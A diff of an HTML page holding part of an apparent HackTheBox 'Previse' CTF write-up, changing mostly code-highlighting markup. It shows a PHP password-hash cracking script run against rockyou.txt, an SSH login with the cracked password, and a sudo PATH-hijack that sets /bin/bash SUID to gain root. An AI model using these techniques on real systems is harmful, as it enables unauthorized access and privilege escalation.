@@ -318,7 +318,7 @@ mysql> show tables;
 +-------------------+
 2 rows in set (0.00 sec)
 
-mysql> select * from accounts;
+mysql&gt; select * from accounts;
 +-----+----------+----------------------------------+---------------------+
 | id  | username | password                         | created_at          |
 +-----+----------+----------------------------------+---------------------+
@@ -326,26 +326,26 @@ mysql> select * from accounts;
 | ... | ...      | ...                              | ...                 |
 +-----+----------+----------------------------------+---------------------+
 3 rows in set (0.00 sec)
-</code></pre></div><p>This hash is a bit weird because it contains an <em>emoji</em> in the salt part of the hash. Using <code>john</code> and <code>hashcat</code> will be difficult because of the format. Although it can be solved, it is better to create a PHP script and crack the hash using the same hashing method used in the server (see files <code>accounts.php</code> or <code>login.php</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$passHash <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.&#39;</span>;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($file <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#39;rockyou.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>feof</span>($file)) {
-</span></span><span style=display:flex><span>        $password <span style=color:#f92672>=</span> <span style=color:#a6e22e>fgets</span>($file);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>crypt</span>(<span style=color:#a6e22e>trim</span>($password), <span style=color:#e6db74>&#39;$1$🧂llol$&#39;</span>) <span style=color:#f92672>==</span> $passHash) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> $password;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>($file);
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>And the password is found:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>php</span> crack.php
-ilovecody112235!
+</code></pre></div><p>This hash is a bit weird because it contains an <em>emoji</em> in the salt part of the hash. Using <code>john</code> and <code>hashcat</code> will be difficult because of the format. Although it can be solved, it is better to create a PHP script and crack the hash using the same hashing method used in the server (see files <code>accounts.php</code> or <code>login.php</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>&lt;?php</span>
+
+<span class=mtk1>$passHash</span> <span class=mtk5>=</span> <span class=mtk4>'$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.'</span><span class=mtk1>;</span>
+
+<span class=mtk5>if</span> <span class=mtk1>($file</span> <span class=mtk5>=</span> <span class=mtk7>fopen</span><span class=mtk1>(</span><span class=mtk4>'rockyou.txt'</span><span class=mtk1>,</span> <span class=mtk4>'r'</span><span class=mtk1>))</span> <span class=mtk1>{</span>
+    <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk7>feof</span><span class=mtk1>($file))</span> <span class=mtk1>{</span>
+        <span class=mtk1>$password</span> <span class=mtk5>=</span> <span class=mtk7>fgets</span><span class=mtk1>($file);</span>
+
+        <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk7>crypt</span><span class=mtk1>(</span><span class=mtk7>trim</span><span class=mtk1>($password),</span> <span class=mtk4>'$1$🧂llol$'</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk1>$passHash)</span> <span class=mtk1>{</span>  
+            <span class=mtk7>echo</span> <span class=mtk1>$password;</span>
+            <span class=mtk5>break</span><span class=mtk1>;</span>
+        <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+
+    <span class=mtk7>fclose</span><span class=mtk1>($file);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>And the password is found:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>php</span> crack.php
+ilovecody112235!  
 </code></pre></div><p>Now we can login via SSH and get the <code>user.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> m4lwhere@10.10.11.104
-m4lwhere@10.10.11.104's password:
+m4lwhere@10.10.11.104's password:  
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ cat user.txt
 ab438774e2b02effcf6d49753e5c8cb8
 </code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>This user can run a Bash script as <code>root</code> using <code>sudo</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ sudo -l
@@ -353,37 +353,37 @@ ab438774e2b02effcf6d49753e5c8cb8
 User m4lwhere may run the following commands on previse:
     (root) /opt/scripts/access_backup.sh
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ ls -l /opt/scripts/access_backup.sh
--rwxr-xr-x 1 root root 486 Jun  6 12:49 <span class=code-green>/opt/scripts/access_backup.sh</span>
+-rwxr-xr-x 1 root root 486 Jun  6 12:49 <span class=code-green>/opt/scripts/access_backup.sh</span>  
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>~</span>$ cat /opt/scripts/access_backup.sh
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#75715e># We always make sure to store logs, we take security SERIOUSLY here</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
-</span></span><span style=display:flex><span><span style=color:#75715e># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_access.gz
-</span></span><span style=display:flex><span>gzip -c /var/www/file_access.log &gt; /var/backups/<span style=color:#66d9ef>$(</span>date --date<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yesterday&#34;</span> +%Y%b%d<span style=color:#66d9ef>)</span>_file_access.gz
-</span></span></code></pre></div><p>We cannot modify the file. However, the <code>gzip</code> command is being used in relative mode (as well as <code>date</code>). This is vulnerable to a <code>PATH</code> hijacking because there is no <code>secure_path</code> in the output of <code>sudo -l</code>.</p><p>First, we create our own <code>gzip</code> command in <code>/tmp</code>, as an executable Bash script that sets <code>/bin/bash</code> as a SUID file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > gzip
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/bin/bash</span>
+
+<span class=mtk3>#</span> <span class=mtk3>We</span> <span class=mtk3>always</span> <span class=mtk3>make</span> <span class=mtk3>sure</span> <span class=mtk3>to</span> <span class=mtk3>store</span> <span class=mtk3>logs,</span> <span class=mtk3>we</span> <span class=mtk3>take</span> <span class=mtk3>security</span> <span class=mtk3>SERIOUSLY</span> <span class=mtk3>here</span>
+
+<span class=mtk3>#</span> <span class=mtk3>I</span> <span class=mtk3>know</span> <span class=mtk3>I</span> <span class=mtk3>shouldnt</span> <span class=mtk3>run</span> <span class=mtk3>this</span> <span class=mtk3>as</span> <span class=mtk3>root</span> <span class=mtk3>but</span> <span class=mtk3>I</span> <span class=mtk3>cant</span> <span class=mtk3>figure</span> <span class=mtk3>it</span> <span class=mtk3>out</span> <span class=mtk3>programmatically</span> <span class=mtk3>on</span> <span class=mtk3>my</span> <span class=mtk3>account</span>
+<span class=mtk3>#</span> <span class=mtk3>This</span> <span class=mtk3>is</span> <span class=mtk3>configured</span> <span class=mtk3>to</span> <span class=mtk3>run</span> <span class=mtk3>with</span> <span class=mtk3>cron,</span> <span class=mtk3>added</span> <span class=mtk3>to</span> <span class=mtk3>sudo</span> <span class=mtk3>so</span> <span class=mtk3>I</span> <span class=mtk3>can</span> <span class=mtk3>run</span> <span class=mtk3>as</span> <span class=mtk3>needed</span> <span class=mtk3>-</span> <span class=mtk3>we'll</span> <span class=mtk3>fix</span> <span class=mtk3>it</span> <span class=mtk3>later</span> <span class=mtk3>when</span> <span class=mtk3>there's</span> <span class=mtk3>time</span>  
+
+<span class=mtk1>gzip</span> <span class=mtk1>-c</span> <span class=mtk1>/var/log/apache2/access.log</span> <span class=mtk5>&gt;</span> <span class=mtk1>/var/backups/</span><span class=mtk4>$(date</span> <span class=mtk4>--date="yesterday"</span> <span class=mtk4>+%Y%b%d)</span><span class=mtk1>_access.gz</span>
+<span class=mtk1>gzip</span> <span class=mtk1>-c</span> <span class=mtk1>/var/www/file_access.log</span> <span class=mtk5>&gt;</span> <span class=mtk1>/var/backups/</span><span class=mtk4>$(date</span> <span class=mtk4>--date="yesterday"</span> <span class=mtk4>+%Y%b%d)</span><span class=mtk1>_file_access.gz</span>
+</code></pre></div><p>We cannot modify the file. However, the <code>gzip</code> command is being used in relative mode (as well as <code>date</code>). This is vulnerable to a <code>PATH</code> hijacking because there is no <code>secure_path</code> in the output of <code>sudo -l</code>.</p><p>First, we create our own <code>gzip</code> command in <code>/tmp</code>, as an executable Bash script that sets <code>/bin/bash</code> as a SUID file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' &gt; gzip  
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ chmod +x gzip
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ cat gzip
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>chmod u+s /bin/bash
-</span></span></code></pre></div><p>Then, we add <code>/tmp</code> at the beginning of the <code>PATH</code> environment variable, so that the malicious <code>gzip</code> is found before the common one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo $PATH
+#!/bin/bash
+chmod u+s /bin/bash
+</code></pre></div><p>Then, we add <code>/tmp</code> at the beginning of the <code>PATH</code> environment variable, so that the malicious <code>gzip</code> is found before the common one:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ export PATH=/tmp:$PATH
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ echo $PATH
-/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ which gzip
 /tmp/gzip
 </code></pre></div><p>And finally, we can execute the Bash script with <code>root</code> permissions, so that <code>/bin/bash</code> is converted to an SUID binary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ ls -l /bin/bash
 -rwxr-xr-x 1 root root 1113504 Jun  6  2019 <span class=code-green>/bin/bash</span>
-<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ sudo /opt/scripts/access_backup.sh
+<span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ sudo /opt/scripts/access_backup.sh  
 <span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ ls -l /bin/bash
--rwsr-xr-x 1 root root 1113504 Jun  6  2019 <span class=code-bg-red>/bin/bash</span>
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 <span class="code-white code-bg-red">/bin/bash</span>
 </code></pre></div><p>Now we have rooted the machine, so we can read the <code>root.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>m4lwhere@previse</span>:<span class=code-blue>/tmp</span>$ bash -p
 bash-4.4# cat /root/root.txt
-3b2115c0ed9ca779182d6d777b1ed40a
+3b2115c0ed9ca779182d6d777b1ed40a  
 </code></pre></div><div class="mt6 instapaper_ignoref">
 </div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop">
 <div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
